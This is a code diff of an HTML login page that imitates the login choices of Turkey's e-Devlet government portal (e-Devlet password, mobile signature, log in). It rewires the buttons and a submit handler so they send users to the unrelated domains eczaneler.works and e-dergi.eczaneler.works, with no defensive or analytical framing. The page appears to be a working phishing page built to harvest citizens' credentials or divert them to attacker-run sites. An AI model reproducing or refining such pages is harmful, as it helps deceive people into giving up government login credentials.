@@ -32,10 +32,10 @@
                         <form method="post" id="loginForm" name="sifreGirisForm" autocomplete="off">
                             <fieldset>
                                 <div class="form-row center-item">
+                                    <button onclick="alert('E-devlet Şifresi seçildi.');" class="btn btn-send" name="submitButton" type="button">E-devlet Şifresi</button>
                                     <button onclick="location.href='https://eczaneler.works/';" class="btn btn-cancel" name="cancelButton" value="İptal">İptal</button>
-                                    <button class="btn btn-send" name="submitButton" type="button" onclick="redirect('https://eczaneler.works/');">E-devlet Şifresi</button>
-                                    <button class="btn btn-send" name="submitButton" type="button" onclick="redirect('https://e-dergi.eczaneler.works/');">Mobil İmza</button>
-                                    <button class="btn btn-send" name="submitButton" type="submit">Giriş Yap</button>
+                                    <button onclick="alert('Mobil İmza seçildi.');" class="btn btn-send" name="submitButton" type="button">Mobil İmza</button>
+                                    <button onclick="location.href='https://e-dergi.eczaneler.works/';" class="btn btn-send" name="submitButton" type="submit">Giriş Yap</button>
                                 </div>
                             </fieldset>
                         </form>
@@ -59,18 +59,14 @@
     </div>
 
     <script type="text/javascript">
-        function redirect(url) {
-            window.location.href = url;
-        }
-
         document.getElementById("loginForm").addEventListener("submit", function (event) {
             var selectedButton = document.querySelector(".btn-send:focus");
             if (selectedButton && selectedButton.textContent === "E-devlet Şifresi") {
-                redirect("https://eczaneler.works/");
                 event.preventDefault();
+                location.href = "https://eczaneler.works/";
             } else if (selectedButton && selectedButton.textContent === "Mobil İmza") {
-                redirect("https://e-dergi.eczaneler.works/");
                 event.preventDefault();
+                location.href = "https://e-dergi.eczaneler.works/";
             }
         });
     </script>
